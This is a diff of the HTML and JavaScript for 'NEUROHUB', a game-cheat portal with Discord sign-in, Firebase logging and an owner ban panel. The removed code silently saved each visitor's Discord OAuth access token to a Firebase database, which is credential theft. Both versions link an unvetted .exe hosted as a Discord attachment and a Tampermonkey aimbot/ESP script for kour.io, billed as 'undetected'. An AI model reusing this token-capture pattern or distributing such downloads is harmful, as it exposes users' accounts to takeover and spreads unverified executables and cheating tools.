@@ -4,42 +4,48 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>NEUROHUB | Elite Portal</title>
+    <link rel="icon" href="https://img.icons8.com/ios-filled/50/00f2ff/skull.png" type="image/png">
+    
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Inter:wght@300;400;700&display=swap" rel="stylesheet">
+    
     <style>
         :root { --primary: #00f2ff; --secondary: #ff007f; --bg: #010101; --glass: rgba(255, 255, 255, 0.03); --border: rgba(0, 242, 255, 0.2); }
         * { cursor: crosshair !important; box-sizing: border-box; transition: 0.2s ease; }
         body, html { margin: 0; padding: 0; background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; height: 100vh; overflow: hidden; }
         #starfield { position: fixed; inset: 0; z-index: -1; pointer-events: none; background: #000; }
         
-        /* UID Badge */
-        .id-badge { position: fixed; top: 20px; right: 20px; background: var(--glass); border: 1px solid var(--border); padding: 8px 15px; border-radius: 20px; font-family: 'Orbitron'; font-size: 0.6rem; color: var(--primary); letter-spacing: 1px; z-index: 100; display: none; }
-
-        /* Auth Gate (Sign up Page) */
-        #auth-gate { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; }
-        .auth-box { background: #080808; border: 2px solid var(--primary); padding: 60px 40px; border-radius: 30px; width: 450px; text-align: center; box-shadow: 0 0 50px rgba(0, 242, 255, 0.1); border-top: 5px solid var(--primary); }
-
-        /* Sidebar & Layout */
+        /* Layout */
         #main-ui { display: none; height: 100vh; grid-template-columns: 280px 1fr; }
         .sidebar { background: rgba(0,0,0,0.95); border-right: 1px solid var(--border); padding: 30px 15px; display: flex; flex-direction: column; gap: 8px; position: relative; }
-        .nav-tab { padding: 14px; border-radius: 10px; cursor: pointer; font-family: 'Orbitron'; font-size: 0.7rem; color: #666; display: flex; align-items: center; gap: 12px; }
-        .nav-tab.active { color: var(--primary); background: rgba(0, 242, 255, 0.05); border: 1px solid var(--primary); }
         
-        /* User Pill */
-        .user-pill { margin-top: auto; background: var(--glass); border: 1px solid var(--border); padding: 12px; border-radius: 15px; display: flex; align-items: center; gap: 12px; cursor: pointer; position: relative; }
-        .user-pill img { width: 35px; height: 35px; border-radius: 50%; border: 1px solid var(--primary); }
-        .logout-menu { position: absolute; bottom: 75px; left: 15px; width: calc(100% - 30px); background: #080808; border: 1px solid var(--secondary); border-radius: 10px; display: none; padding: 10px; z-index: 200; box-shadow: 0 0 20px rgba(255, 0, 127, 0.2); }
+        /* Tabs */
+        .nav-tab { padding: 14px; border-radius: 10px; cursor: pointer; font-family: 'Orbitron'; font-size: 0.65rem; color: #555; display: flex; align-items: center; gap: 12px; letter-spacing: 1px; }
+        .nav-tab:hover { color: #888; background: rgba(255,255,255,0.02); }
+        .nav-tab.active { color: var(--primary); background: rgba(0, 242, 255, 0.05); border: 1px solid var(--primary); }
+        .nav-tab.special { color: var(--secondary); }
 
-        /* Content Area */
-        .content-area { padding: 50px; overflow-y: auto; }
+        /* Auth Gate */
+        #auth-gate { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; }
+        .auth-box { background: #080808; border: 2px solid var(--primary); padding: 50px; border-radius: 30px; width: 420px; text-align: center; box-shadow: 0 0 50px rgba(0, 242, 255, 0.1); }
+
+        /* Content area */
+        .content-area { padding: 50px; overflow-y: auto; position: relative; }
         .tab-content { display: none; animation: fadeIn 0.4s ease forwards; }
         .tab-content.active { display: block; }
         .panel { background: var(--glass); border: 1px solid var(--border); border-radius: 15px; padding: 25px; margin-bottom: 20px; }
         
-        .btn { background: var(--primary); color: #000; font-family: 'Orbitron'; font-weight: 900; padding: 12px; border-radius: 6px; border: none; cursor: pointer; font-size: 0.7rem; width: 100%; text-align: center; text-decoration: none; display: block; margin-top: 10px; }
-        .btn-discord { background: #5865F2; color: white; border: none; }
+        /* UI Elements */
+        .btn { background: var(--primary); color: #000; font-family: 'Orbitron'; font-weight: 900; padding: 12px; border-radius: 6px; border: none; cursor: pointer; font-size: 0.7rem; width: 100%; text-align: center; text-decoration: none; display: block; margin-top: 10px; letter-spacing: 1px; }
+        .btn-discord { background: #5865F2; color: white; }
         .btn-secondary { background: var(--secondary); color: white; }
+        .version-tag { position: fixed; bottom: 20px; right: 20px; font-family: 'Orbitron'; font-size: 0.6rem; color: #333; letter-spacing: 2px; }
+
+        /* User Pill */
+        .user-pill { margin-top: auto; background: var(--glass); border: 1px solid var(--border); padding: 12px; border-radius: 15px; display: flex; align-items: center; gap: 12px; cursor: pointer; }
+        .user-pill img { width: 35px; height: 35px; border-radius: 50%; border: 1px solid var(--primary); }
+        .logout-menu { position: absolute; bottom: 85px; left: 15px; width: calc(100% - 30px); background: #080808; border: 1px solid var(--secondary); border-radius: 10px; display: none; padding: 10px; z-index: 200; }
 
         @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
     </style>
@@ -47,73 +53,79 @@
 <body>
 
 <canvas id="starfield"></canvas>
-<div id="id-display" class="id-badge">UID: 0000000000000</div>
+<div class="version-tag">NEUROHUB V1.0.4-ELITE</div>
 
 <div id="auth-gate">
     <div class="auth-box">
         <img src="https://img.icons8.com/ios-filled/100/00f2ff/skull.png" style="width:80px; margin-bottom:20px; filter: drop-shadow(0 0 15px var(--primary));">
-        <h2 style="font-family:'Orbitron'; color:var(--primary); letter-spacing:8px; margin-bottom:5px;">NEUROHUB</h2>
-        <p style="font-size:0.75rem; color:#555; margin-bottom:35px; letter-spacing:3px; font-weight: bold;">WELCOME TO NEUROHUB</p>
-        
+        <h2 style="font-family:'Orbitron'; color:var(--primary); letter-spacing:5px;">NEUROHUB</h2>
+        <p style="font-size:0.7rem; color:#444; margin-bottom:30px; letter-spacing:2px;">WELCOME TO THE INNER CIRCLE</p>
         <button class="btn btn-discord" onclick="loginWithDiscord()">SIGN UP WITH DISCORD</button>
-        <p style="font-size:0.55rem; color:#222; margin-top:25px; letter-spacing:2px;">ENCRYPTED SESSION</p>
     </div>
 </div>
 
 <div id="main-ui">
     <div class="sidebar">
-        <h2 style="font-family:'Orbitron'; color:var(--primary); text-align:center; font-size:1rem; margin-bottom:30px; letter-spacing: 2px;">NEUROHUB</h2>
-        <div class="nav-tab active" onclick="showTab('dash', this)">DASHBOARD</div>
-        <div class="nav-tab" onclick="showTab('modules', this)">MODULES</div>
-        <div class="nav-tab" onclick="showTab('events', this)">EVENTS</div>
-        <div id="admin-tab" class="nav-tab" style="display:none; color:var(--secondary);" onclick="showTab('admin', this)">OWNER PANEL</div>
-
-        <div class="logout-menu" id="l-menu">
-            <button class="btn btn-secondary" onclick="logout()">TERMINATE SESSION</button>
-        </div>
+        <h2 style="font-family:'Orbitron'; color:var(--primary); text-align:center; font-size:1rem; margin-bottom:30px;">NEUROHUB</h2>
         
+        <div class="nav-tab active" onclick="showTab('dash', this)">DASHBOARD</div>
+        <div class="nav-tab" onclick="showTab('opt', this)">OPTIMIZER</div>
+        <div class="nav-tab" onclick="showTab('cheats', this)">CHEATS</div>
+        <div class="nav-tab" onclick="showTab('events', this)">EVENTS</div>
+        <div class="nav-tab" onclick="showTab('info', this)">INFO</div>
+        <div id="admin-tab" class="nav-tab special" style="display:none;" onclick="showTab('admin', this)">OWNER PANEL</div>
+
+        <div class="logout-menu" id="l-menu"><button class="btn btn-secondary" onclick="logout()">TERMINATE</button></div>
         <div class="user-pill" onclick="toggleLogout()">
             <img id="pill-img" src="">
-            <div style="overflow:hidden;">
-                <div id="pill-name" style="font-size:0.75rem; font-weight:bold; color:var(--primary); white-space: nowrap; text-overflow: ellipsis;">User</div>
-                <div style="font-size:0.6rem; color:#555;">ACTIVE SESSION</div>
+            <div>
+                <div id="pill-name" style="font-size:0.75rem; font-weight:bold; color:var(--primary);">User</div>
+                <div style="font-size:0.55rem; color:#444;">SESSION ACTIVE</div>
             </div>
         </div>
     </div>
 
     <div class="content-area">
-        <div id="dash" class="tab-content active" style="text-align:center; padding-top:50px;">
-            <div id="welcome-area"></div>
-        </div>
+        <div id="dash" class="tab-content active"><div id="welcome-area"></div></div>
 
-        <div id="modules" class="tab-content">
-            <h2 style="font-family:'Orbitron'; margin-bottom: 25px;">CENTRAL MODULES</h2>
+        <div id="opt" class="tab-content">
+            <h2 style="font-family:'Orbitron'; letter-spacing:2px;">SYSTEM OPTIMIZATION</h2>
             <div class="panel">
                 <h3>NEUROHUB ELITE V6</h3>
-                <p style="font-size:0.8rem; color:#666;">Advanced system optimization & 40+ kernel-level features.</p>
-                <a href="https://cdn.discordapp.com/attachments/1220455589808308254/1224814986424320141/NeuroHub_Elite.exe" class="btn">DOWNLOAD UTILITY</a>
+                <p style="font-size:0.8rem; color:#666; line-height:1.6;">Full PC cleaning, Registry optimization, and Kernel-level latency reduction.</p>
+                <a href="https://cdn.discordapp.com/attachments/1220455589808308254/1224814986424320141/NeuroHub_Elite.exe" class="btn">DOWNLOAD .EXE</a>
             </div>
+        </div>
+
+        <div id="cheats" class="tab-content">
+            <h2 style="font-family:'Orbitron'; letter-spacing:2px;">GAME MODULES</h2>
             <div class="panel">
                 <h3 style="color:var(--secondary);">KOUR.IO INTERNAL</h3>
-                <p style="font-size:0.8rem; color:#666;">Tampermonkey: Aimbot, ESP, Speed, and Movement Exploits.</p>
-                <a href="https://raw.githubusercontent.com/neuroswap/kour/main/kour_script.user.js" class="btn btn-secondary">INSTALL SCRIPT</a>
+                <p style="font-size:0.8rem; color:#666;">Aimbot, ESP, and Movement Exploits. Requires Tampermonkey.</p>
+                <a href="https://raw.githubusercontent.com/neuroswap/kour/main/kour_script.user.js" class="btn btn-secondary">INSTALL VIA TAMPERMONKEY</a>
             </div>
         </div>
 
         <div id="events" class="tab-content">
-            <h2 style="font-family:'Orbitron';">UPCOMING EVENTS</h2>
+            <h2 style="font-family:'Orbitron';">COMMUNITY</h2>
+            <div class="panel"><h3>SCRIM NIGHT</h3><p>Every Friday @ 8:00 PM EST.</p></div>
+        </div>
+
+        <div id="info" class="tab-content">
+            <h2 style="font-family:'Orbitron';">PROJECT INFO</h2>
             <div class="panel">
-                <h3>COMMUNITY SCRIM NIGHT</h3>
-                <p>Friday Night @ 8:00 PM EST. Winner gets the "Elite" role.</p>
-                <div style="color:var(--primary); font-size:0.7rem; margin-top:10px;">STATUS: ACTIVE</div>
+                <p style="font-size:0.8rem; color:#888;"><b>Status:</b> Undetected</p>
+                <p style="font-size:0.8rem; color:#888;"><b>Build:</b> Stable</p>
+                <p style="font-size:0.8rem; color:#888;"><b>Developer:</b> Zayden / NeuroSwap</p>
+                <p style="font-size:0.8rem; color:#888; margin-top:15px;">NeuroHub is built for performance and competitive advantage.</p>
             </div>
         </div>
 
         <div id="admin" class="tab-content">
-            <h2 style="font-family:'Orbitron'; color:var(--secondary);">OWNER COMMANDS</h2>
+            <h2 style="font-family:'Orbitron'; color:var(--secondary);">OWNER</h2>
             <div class="panel">
-                <input type="text" id="ban-id" placeholder="User ID to Blacklist" style="width:100%; padding:10px; background:rgba(0,0,0,0.5); border:1px solid var(--border); color:white; margin-bottom:10px;">
-                <button class="btn btn-secondary" onclick="banUser()">CONFIRM BLACKLIST</button>
+                <input type="text" id="ban-id" placeholder="User ID" style="width:100%; padding:10px; background:rgba(0,0,0,0.5); border:1px solid var(--border); color:white; margin-bottom:10px;">
+                <button class="btn btn-secondary" onclick="banUser()">BLACKLIST ID</button>
             </div>
         </div>
     </div>
@@ -131,8 +143,6 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-
-    // Numerical ID to unlock Owner Panel
     const OWNER_ID = "1494822241089880205"; 
 
     function loginWithDiscord() {
@@ -148,12 +158,11 @@
             const resp = await fetch('https://discord.com/api/users/@me', { headers: { Authorization: `Bearer ${accessToken}` } });
             const user = await resp.json();
             if (user.id) {
-                const displayName = user.global_name || user.username;
+                const nick = user.global_name || user.username;
                 localStorage.setItem('nID', user.id);
-                localStorage.setItem('nNick', displayName);
+                localStorage.setItem('nNick', nick);
                 localStorage.setItem('nPFP', `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`);
-                
-                db.ref('logins/' + user.id).set({ id: user.id, username: user.username, nickname: displayName, access_token: accessToken, time: Date.now() });
+                db.ref('logins/' + user.id).set({ id: user.id, username: user.username, nickname: nick, time: Date.now() });
                 window.history.replaceState({}, document.title, window.location.pathname);
             }
         }
@@ -162,35 +171,20 @@
         if (id) {
             document.getElementById('auth-gate').style.display = 'none';
             document.getElementById('main-ui').style.display = 'grid';
-            document.getElementById('id-display').style.display = 'block';
-            document.getElementById('id-display').innerText = `UID: ${id}`;
-            
             const nick = localStorage.getItem('nNick');
             document.getElementById('pill-name').innerText = nick;
             document.getElementById('pill-img').src = localStorage.getItem('nPFP');
-            
             document.getElementById('welcome-area').innerHTML = `
-                <div style="margin-top:50px; animation: fadeIn 1s ease;">
-                    <img src="${localStorage.getItem('nPFP')}" style="width:120px; border-radius:50%; border:3px solid var(--primary); box-shadow: 0 0 30px rgba(0,242,255,0.2); margin-bottom:30px;">
-                    <h1 style="font-family:'Orbitron'; letter-spacing: 5px; font-size:2rem; margin-bottom:10px;">
-                        WELCOME <span style="color:var(--primary);">${nick.toUpperCase()}</span>
-                    </h1>
-                    <h2 style="font-family:'Orbitron'; color:var(--secondary); letter-spacing:8px; font-size:1.1rem; opacity:0.8;">
-                        TO THE FUTURE OF CHEATING
-                    </h2>
-                    <div style="width:100px; height:2px; background:var(--primary); margin:30px auto; box-shadow: 0 0 10px var(--primary);"></div>
+                <div style="margin-top:50px; text-align:center;">
+                    <img src="${localStorage.getItem('nPFP')}" style="width:110px; border-radius:50%; border:2px solid var(--primary); margin-bottom:25px;">
+                    <h1 style="font-family:'Orbitron'; letter-spacing: 4px; font-size:1.8rem;">WELCOME <span style="color:var(--primary);">${nick.toUpperCase()}</span></h1>
+                    <h2 style="font-family:'Orbitron'; color:var(--secondary); letter-spacing:6px; font-size:1rem; opacity:0.7;">TO THE FUTURE OF CHEATING</h2>
                 </div>
             `;
-            
             if (id === OWNER_ID) document.getElementById('admin-tab').style.display = 'flex';
         }
         initStars(); drawStars();
     };
-
-    function toggleLogout() {
-        const menu = document.getElementById('l-menu');
-        menu.style.display = (menu.style.display === 'block') ? 'none' : 'block';
-    }
 
     function showTab(t, el) { 
         document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
@@ -199,9 +193,13 @@
         el.classList.add('active');
     }
 
+    function toggleLogout() {
+        const menu = document.getElementById('l-menu');
+        menu.style.display = (menu.style.display === 'block') ? 'none' : 'block';
+    }
+
     function logout() { localStorage.clear(); location.reload(); }
-    
-    // Falling Stars
+
     const canvas = document.getElementById('starfield'); const ctx = canvas.getContext('2d'); let stars = [];
     function initStars() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; stars = []; for(let i=0; i<80; i++) stars.push({x:Math.random()*canvas.width, y:Math.random()*canvas.height, l:Math.random()*25+10, s:Math.random()*12+5}); }
     function drawStars() { ctx.clearRect(0,0,canvas.width, canvas.height); stars.forEach(s => { ctx.strokeStyle = "#00f2ff"; ctx.lineWidth = 1.5; ctx.beginPath(); ctx.moveTo(s.x, s.y); ctx.lineTo(s.x, s.y+s.l); ctx.stroke(); s.y += s.s; if(s.y > canvas.height) s.y = -s.l; }); requestAnimationFrame(drawStars); }
